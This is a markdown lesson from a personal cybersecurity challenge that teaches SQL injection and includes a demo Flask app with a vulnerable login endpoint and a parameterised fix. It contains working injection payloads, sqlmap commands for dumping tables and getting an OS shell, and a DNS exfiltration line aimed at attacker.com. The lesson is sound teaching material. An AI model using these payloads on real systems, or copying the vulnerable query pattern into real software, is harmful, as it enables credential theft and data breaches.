# Day 026 - SQL Injection: From Theory to Exploitation

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

SQL Injection has been in the OWASP Top 10 since the list was created.

It's been known since 1998.

It still causes major breaches today.

Not because it's hard to fix - parameterised queries solve it completely, in one line of code. It persists because developers write vulnerable code without understanding what's happening underneath.

Today: how SQL injection works from first principles, every major variant, and how to find and exploit it - so you understand exactly what to look for and what to fix.

> ⚠️ Practice only on DVWA (running on Metasploitable2) or dedicated vulnerable apps. Never test on systems you don't own.

---

## 🗄️ How SQL Queries Work

A typical login form runs a query like this:

```sql
SELECT * FROM users 
WHERE username = 'alice' 
AND password = 'mypassword';
```

If a row is returned - login succeeds.
If no row - login fails.

The problem: if the application builds this query by concatenating user input directly, an attacker controls part of the SQL statement.

---

## 💉 Basic SQL Injection - Authentication Bypass

**Vulnerable code (Python/PHP pattern):**
```python
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

**Attacker input:**
```
Username: admin'--
Password: anything
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

`--` is a SQL comment. Everything after it is ignored.

The query becomes:
```sql
SELECT * FROM users WHERE username='admin'
```

Returns the admin row. Login succeeds. No password needed.

---

## 🔀 OR-Based Bypass

```
Username: ' OR '1'='1'--
Password: anything
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username='' OR '1'='1'--' AND password='anything'
```

`'1'='1'` is always true. Returns every user in the table. Logs in as the first user (often admin).

---

## 🗂️ SQLi Variants

### 1. In-Band SQLi (most common)
Results returned directly in the response.

**UNION-based:** Extract data from other tables using UNION SELECT.

```sql
-- First: find number of columns in original query
' ORDER BY 1--   (no error)
' ORDER BY 2--   (no error)
' ORDER BY 3--   (error = 2 columns)

-- Then: extract data
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, null FROM information_schema.tables--
```

**Error-based:** Force the database to reveal information in error messages.
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
```

---

### 2. Blind SQLi
No data returned directly - attacker infers information from application behaviour.

**Boolean-based:**
```sql
-- True condition - normal response
' AND 1=1--

-- False condition - different response (empty page, error, redirect)
' AND 1=2--

-- Extract data character by character
' AND SUBSTRING(username,1,1)='a'--   → different response if first char is 'a'
' AND SUBSTRING(username,1,1)='b'--   → test next character
```

**Time-based:**
When there's no visible difference in responses - use time delays.
```sql
-- MySQL
' AND SLEEP(5)--           → page delays 5 seconds = vulnerable

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- Extract data via timing
' AND IF(SUBSTRING(username,1,1)='a', SLEEP(3), 0)--
→ 3 second delay = first character is 'a'
```

---

### 3. Out-of-Band SQLi
Exfiltrate data via DNS or HTTP requests to an external server.
Used when in-band and blind techniques don't work.
```sql
-- MySQL: DNS exfiltration
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x'))--
```

---

## 🗺️ SQLi Attack Map

```
Identify injection point
        ↓
Confirm vulnerability (error, behavioural change, time delay)
        ↓
Determine database type (MySQL, PostgreSQL, MSSQL, SQLite, Oracle)
        ↓
Find number of columns (ORDER BY or UNION SELECT NULL)
        ↓
Extract database name → table names → column names → data
        ↓
Escalate (read files, write files, OS command execution if possible)
```

---

## 🔧 SQLMap - Automated SQLi

```bash
# Basic scan - detect and exploit SQLi
sqlmap -u "http://target/page?id=1"

# POST request
sqlmap -u "http://target/login" \
  --data="username=admin&password=test" \
  --dbs

# With session cookie (authenticated scan)
sqlmap -u "http://target/page?id=1" \
  --cookie="PHPSESSID=abc123"

# Extract all databases
sqlmap -u "http://target/page?id=1" --dbs

# Extract tables from a database
sqlmap -u "http://target/page?id=1" -D dvwa --tables

# Extract columns from a table
sqlmap -u "http://target/page?id=1" -D dvwa -T users --columns

# Dump table data
sqlmap -u "http://target/page?id=1" -D dvwa -T users --dump

# Try to get OS shell (if DB user has FILE privilege)
sqlmap -u "http://target/page?id=1" --os-shell

# Specify DB type (faster)
sqlmap -u "http://target/page?id=1" --dbms=mysql

# Increase verbosity
sqlmap -u "http://target/page?id=1" -v 3
```

---

## 💻 The Code - SQLi Demo (Vulnerable + Fixed)

```python
"""
Day 026 - SQL Injection Demo
100 Days of Cybersecurity by Sudeep Ravichandran

Shows a vulnerable login implementation and the
one-line fix that prevents SQL injection entirely.

Run: python3 sqli_demo.py
Requires: pip install flask
"""

from flask import Flask, request, jsonify
import sqlite3
import os

app = Flask(__name__)
DB = "demo.db"


def init_db():
    """Create demo database with sample users."""
    conn = sqlite3.connect(DB)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            role TEXT
        )
    """)
    conn.execute("DELETE FROM users")
    conn.executemany(
        "INSERT INTO users VALUES (?, ?, ?, ?)",
        [
            (1, "admin", "supersecret", "admin"),
            (2, "alice", "password123", "user"),
            (3, "bob",   "letmein",     "user"),
        ]
    )
    conn.commit()
    conn.close()


# ─────────────────────────────────────────────
# VULNERABLE endpoint - DO NOT USE IN PRODUCTION
# ─────────────────────────────────────────────
@app.route("/login/vulnerable", methods=["POST"])
def login_vulnerable():
    username = request.json.get("username", "")
    password = request.json.get("password", "")

    conn = sqlite3.connect(DB)

    # ❌ VULNERABLE: direct string concatenation
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"\n[VULNERABLE] Query: {query}")

    result = conn.execute(query).fetchone()
    conn.close()

    if result:
        return jsonify({
            "status": "success",
            "user": result[1],
            "role": result[3],
            "warning": "VULNERABLE endpoint - SQLi possible"
        })
    return jsonify({"status": "failed"})


# ─────────────────────────────────────────────
# SECURE endpoint - parameterised query
# ─────────────────────────────────────────────
@app.route("/login/secure", methods=["POST"])
def login_secure():
    username = request.json.get("username", "")
    password = request.json.get("password", "")

    conn = sqlite3.connect(DB)

    # ✅ SECURE: parameterised query - user input never touches SQL
    query = "SELECT * FROM users WHERE username=? AND password=?"
    print(f"\n[SECURE] Query: {query} | Params: ({username}, {password})")

    result = conn.execute(query, (username, password)).fetchone()
    conn.close()

    if result:
        return jsonify({
            "status": "success",
            "user": result[1],
            "role": result[3]
        })
    return jsonify({"status": "failed"})


if __name__ == "__main__":
    init_db()
    print("=" * 55)
    print("SQLi Demo Server - Day 026")
    print("=" * 55)
    print("\nTest the VULNERABLE endpoint:")
    print('  Normal login:')
    print('  curl -s -X POST http://127.0.0.1:5000/login/vulnerable \\')
    print('    -H "Content-Type: application/json" \\')
    print('    -d \'{"username":"admin","password":"supersecret"}\'')
    print('\n  SQLi bypass (no password needed):')
    print('  curl -s -X POST http://127.0.0.1:5000/login/vulnerable \\')
    print('    -H "Content-Type: application/json" \\')
    print('    -d \'{"username":"admin\'--","password":"wrong"}\'')
    print('\n  OR bypass (returns first user):')
    print('  curl -s -X POST http://127.0.0.1:5000/login/vulnerable \\')
    print('    -H "Content-Type: application/json" \\')
    print("    -d '{\"username\":\"' OR '1'='1'--\",\"password\":\"x\"}'")
    print("\nTry the same payloads on /login/secure - they won't work.")
    print("\nStarting server on http://127.0.0.1:5000")
    app.run(debug=False)
```

**To run:**
```bash
pip install flask
python3 sqli_demo.py
```

---

## 🛡️ Prevention

| Method | How |
|--------|-----|
| Parameterised queries | `cursor.execute("SELECT * FROM users WHERE username=?", (username,))` |
| Stored procedures | Pre-compiled SQL - user input treated as data only |
| Input validation | Whitelist expected characters, reject everything else |
| Least privilege | DB user only has SELECT on needed tables - no DROP, no FILE |
| WAF | Catches obvious payloads - not a complete solution |
| Error handling | Never expose DB errors to users - they reveal table/column names |

**The fix is literally one line.** Parameterised queries. Every time. No exceptions.

---

## 🔑 Key Takeaways

- SQLi happens when user input is concatenated into SQL queries instead of parameterised
- Authentication bypass, data extraction, file read/write, and OS command execution are all possible
- Blind SQLi uses timing or behaviour differences when no data is returned directly
- SQLMap automates the entire attack chain - detection to data dump
- The fix is parameterised queries - not input sanitisation, not a WAF
- DVWA (running on Metasploitable2) has a SQLi module - practice there

---

## 📚 Resources
- [PortSwigger SQLi Labs (free)](https://portswigger.net/web-security/sql-injection)
- [DVWA - Damn Vulnerable Web App](http://www.dvwa.co.uk/)
- [SQLMap documentation](https://sqlmap.org/)

---

## [⬅️ Day 025](../day025/) | [➡️ Day 027](../day027/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*